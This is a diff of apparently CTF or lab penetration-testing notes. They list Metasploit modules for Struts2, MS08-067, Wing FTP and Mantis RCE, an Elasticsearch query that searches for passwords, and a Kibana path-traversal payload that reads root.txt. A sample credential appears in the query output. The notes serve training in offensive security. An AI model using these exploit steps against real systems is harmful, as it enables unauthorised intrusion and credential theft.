@@ -1,5 +1,6 @@
 # Pwn'd
 - https://ippsec.rocks/?#
+### Apache Struts2
 - 80/tcp  open  http    Apache Tomcat/Coyote JSP engine 1.1
 - |_http-server-header: Apache-Coyote/1.1
 - | http-title: Santa Naughty and Nice Tracker
@@ -15,12 +16,14 @@ exploit(multi/http/struts2_content_type_ognl)
 nmap --scripts=smb-vuln* $ip
 exploit(windows/smb/ms08_067_netapi)
 ````
+### Wing FTP Server
 - 21/tcp open  wingftp
 - Gain access to the admin panel
 ````
 search lua
 exploit(windows/ftp/wing_ftp_admin_exec)
 ````
+### Mantis Bug Tracker
 - 80/tcp  open  http  mantisbt-2.3.0
 - CVE:2019-15715 2017-7615
 - Mantis Bug Tracker 2.3.0 - Remote Code Execution (Unauthenticated)
@@ -38,7 +41,7 @@ sudo /sbin/reboot
 - OS: Microsoft Windows 2008| Vista | 7
 - exploit: multi/http/struts2_rest_xstream
 - Targeturi: /struts2-rest-showcase/orders/
-- Kibana
+### Kibana
 - 5601 is the elastic search port, 9200 is the api
 ````
 curl -X GET "10.10.15.175:9200/_search?q=password&pretty"                                                                                                                                                                  130 ⨯
@@ -66,11 +69,11 @@ curl -X GET "10.10.15.175:9200/_search?q=password&pretty"                       
           "message" : "hey, can you access my dev account for me. My username is l33tperson and my password is 9Qs58Ol3AXkMWLxiEyUyyf"
 ````
 - If there are log files like on port 8000 which are showing you active kabana logs you can have a LFI vulnerability
-- go to the 5601 port and add this extension `/api/console/api_server?sense_version=@@SENSE_VERSION&apis=../../../../../../.../../../../root.txt`
+- Go to the 5601 port and add this extension `/api/console/api_server?sense_version=@@SENSE_VERSION&apis=../../../../../../.../../../../root.txt`
 ````
 10.10.156.71:5601/api/console/api_server?sense_version=@@SENSE_VERSION&apis=../../../../../../.../../../../root.txt
 ````
-- then curl the logs and grep for root.txt
+- Then curl the logs and grep for root.txt
 ````
 curl -s http://10.10.31.117:8000/kibana-log.txt | grep "root.txt" 
 ````
